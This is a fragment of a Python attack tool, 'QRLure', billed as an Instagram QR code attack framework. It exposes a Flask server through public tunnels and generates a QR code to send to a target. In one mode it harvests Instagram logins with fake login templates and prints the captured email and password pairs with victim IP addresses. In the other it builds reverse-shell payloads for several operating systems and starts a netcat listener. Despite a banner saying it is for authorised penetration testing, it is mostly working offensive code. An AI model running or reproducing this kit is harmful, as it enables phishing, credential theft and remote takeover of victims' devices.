    log.info("[*] Generating Python reverse shell (fallback)...")
    generate_python_reverse_shell(lhost, lport, out_file)
    log.info(f"[+] Python payload: {out_file}")
    return out_file

def start_listener(lport: int):
    """Start netcat listener (blocking, runs in thread)."""
    log.info(f"[*] Starting listener on 0.0.0.0:{lport}")
    log.info(f"    Wait for incoming connection...")
    try:
        subprocess.run(["nc", "-lvnp", str(lport)])
    except FileNotFoundError:
        log.error("[!] netcat not found. Install: apt install netcat-openbsd")
    except KeyboardInterrupt:
        pass

# ============================================================
# ASCII BANNER
# ============================================================
def banner():
    print(r"""
    ╔══════════════════════════════════════════════╗
    ║          QRLure v2.1 - Instagram             ║
    ║        QR Code Attack Framework              ║
    ║     For Authorized Penetration Testing       ║
    ╚══════════════════════════════════════════════╝
    """)

def show_summary(url: str, tunnel_name: str):
    print("\n" + "="*65)
    print("  ATTACK CHAIN DEPLOYED")
    print("="*65)
    print(f"  Tunnel:     {tunnel_name}")
    print(f"  Public URL: {url}")
    print(f"  QR Code:    {QR_CODE_OUTPUT}")
    print()
    if current_mode == "harvest":
        print(f"  Mode:       Credential Harvesting ({selected_template})")
        print(f"  Creds file: {CAPTURED_CREDS_FILE}")
        print(f"  Track URL:  {url}/track (1x1 pixel)")
    else:
        print(f"  Mode:       Payload Delivery ({args.target_os})")
        print(f"  Payload:    {payload_path}")
        print(f"  LHOST:      {payload_lhost}")
        print(f"  LPORT:      {payload_lport}")
        print(f"  Listener:   nc -lvnp {payload_lport}")
    print()
    print(f"  Log file:   {LOG_FILE}")
    print("="*65)
    print("  [*] Send the QR code image to the target")
    print("  [*] When they scan it, you'll see activity here")
    print("  [*] Press Ctrl+C to stop\n")

# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    banner()

    parser = argparse.ArgumentParser(
        description="QRLure - Instagram QR Code Attack Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  python3 qrlure_instagram.py --mode harvest --template instagram
  python3 qrlure_instagram.py --mode harvest --template instagram_login --tunnel jprq
  python3 qrlure_instagram.py --mode payload --target-os windows --lport 4444
  python3 qrlure_instagram.py --mode payload --target-os linux --lport 4444 --tunnel ssh
        """
    )
    parser.add_argument("--mode", choices=["harvest", "payload"], default="harvest")
    parser.add_argument("--template", choices=list(LOGIN_TEMPLATES.keys()), default="instagram")
    parser.add_argument("--target-os", choices=["windows", "linux", "android", "macos"], default="windows")
    parser.add_argument("--lhost", default=None, help="Listener host (default: auto from tunnel)")
    parser.add_argument("--lport", type=int, default=4444)
    parser.add_argument("--port", type=int, default=LOCAL_PORT)
    parser.add_argument("--tunnel", choices=["auto", "jprq", "ngrok", "ssh", "direct"], default="auto",
                        help="Tunnel method (default: auto-detect)")
    parser.add_argument("--region", default="us", help="ngrok region")

    args = parser.parse_args()
    current_mode = args.mode
    selected_template = args.template

    # --- Start Flask ---
    log.info(f"[*] Starting Flask on 0.0.0.0:{args.port}...")
    flask_thread = threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=args.port, debug=False, use_reloader=False),
        daemon=True
    )
    flask_thread.start()
    time.sleep(1.5)

    # --- Tunnel ---
    public_url, tunnel_proc = setup_tunnel(args.port, args.tunnel)
    tunnel_name = args.tunnel if args.tunnel != "auto" else "direct"

    # --- Payload mode setup ---
    if args.mode == "payload":
        # LHOST: extract from tunnel URL, or use provided
        if args.lhost:
            payload_lhost = args.lhost
        else:
            parsed = urlparse(public_url)
            payload_lhost = parsed.hostname

        payload_lport = args.lport
        payload_path = generate_payload(payload_lhost, payload_lport)

        # Start listener in background
        listener_thread = threading.Thread(target=start_listener, args=(payload_lport,), daemon=True)
        listener_thread.start()

    # --- Generate QR Code ---
    log.info(f"[*] Generating QR code for URL: {public_url}")
    generate_qr_code(public_url)

    # --- Summary ---
    show_summary(public_url, tunnel_name)

    # --- Keep alive ---
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log.info("\n[*] Shutting down...")
        if tunnel_proc:
            try: tunnel_proc.terminate()
            except: pass
        log.info("[*] Cleanup complete.")
        if captured_creds:
            print(f"\n[!] Captured {len(captured_creds)} credentials:")
            for c in captured_creds:
                print(f"    {c['email']} : {c['password']} (from {c['ip']})")
        log.info("[*] Goodbye.")
